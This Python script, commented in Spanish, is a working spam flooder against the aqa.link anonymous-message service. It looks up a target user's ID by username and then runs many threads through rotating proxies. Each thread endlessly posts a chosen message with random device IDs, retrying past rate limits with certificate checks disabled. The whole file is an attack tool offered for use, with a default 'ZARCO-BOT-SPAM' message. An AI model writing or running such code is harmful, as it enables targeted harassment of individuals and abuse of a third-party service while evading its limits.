import uuid
import requests
import sys
import random
import time
import threading
import urllib3

# Desactivar las advertencias
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Leer proxies
try:
    with open('proxies.txt', 'r') as file:
        proxies_list = file.read().splitlines()
except FileNotFoundError:
    print("[X] Archivo 'proxies.txt' no encontrado.")
    sys.exit()

counter_lock = threading.Lock()

# Obtener el Id del Usuario a Atacar
def get_user_id(username):
    url = "https://aqa.link/portal/user/getInfoByUserName"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://aqa.link",
        "Referer": f"https://aqa.link/{username}"
    }
    
    response = requests.post(url, json={"userName": username}, headers=headers)
    
    if response.status_code == 200:
        json_response = response.json()
        if json_response.get("code") == 200 and "data" in json_response:
            user_id = json_response["data"].get("id")
            if user_id:
                return user_id
    print(f"[X] No se pudo obtener el ID de {username}.")
    sys.exit()
    return None

def send_single_message(prox, user_id, message, counter):
    while True:
        try:
            px = {'http': prox, 'https': prox}
            
            formatted_time = time.strftime("%H:%M", time.localtime())
            deviceId = str(uuid.uuid4())
            
            url = "https://aqa.link/portal/message/send"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://aqa.link",
                "Referer": f"https://aqa.link/{user_id}"
            }
            
            data = {
                "toUserId": user_id,
                "content": message,
                "deviceId": deviceId,
                "topic": 1
            }
            
            response = requests.post(url, headers=headers, json=data, proxies=px, timeout=10, verify=False)
            
            if response.status_code != 200:
                print(f'[{formatted_time}] [Err] Ratelimited')
                time.sleep(10)
            else:
                with counter_lock:
                    counter[0] += 1
                    print(f'[{formatted_time}] [Msg] Sent: {counter[0]}')
        except Exception:
            time.sleep(10)


# Enviar SPAM
def send_message(username, message):
    user_id = get_user_id(username)
    if not user_id:
        print("[X] No se enviará el mensaje porque no se pudo obtener el ID.")
        return
    
    counter = [0]
    threads = []
    
    for prox in proxies_list:
        for _ in range(5):  # 5 mensajes por proxy
            t = threading.Thread(target=send_single_message, args=(prox, user_id, message, counter))
            threads.append(t)
            t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    username = input("User => ")
    message = input("Message => ") or "☠✞𝑍𝐴𝑅𝐶𝑂-𝐵𝑂𝑇-𝑆𝑃𝐴𝑀✞☠"
    send_message(username, message)
